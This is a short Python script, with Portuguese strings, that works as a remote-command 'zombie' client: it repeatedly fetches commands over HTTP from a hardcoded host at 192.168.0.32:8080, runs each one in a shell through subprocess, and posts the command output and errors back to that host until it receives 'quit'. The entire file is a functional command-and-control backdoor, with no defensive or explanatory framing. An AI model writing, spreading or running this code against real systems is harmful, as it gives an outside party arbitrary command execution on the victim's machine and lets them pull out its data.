import requests
import subprocess
import time

_url = 'http://192.168.0.32:8080'

while True:
    print(f"Conectando para ser um zumbi de {_url}")
    req = requests.get(_url)
    command = req.text

    if 'quit' in command:
        break

    else:
        try:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url=_url, data=CMD.stdout.read())
            post_response = requests.post(url=_url, data=CMD.stderr.read())
        except Exception as e:
            print(f"=( {e}")
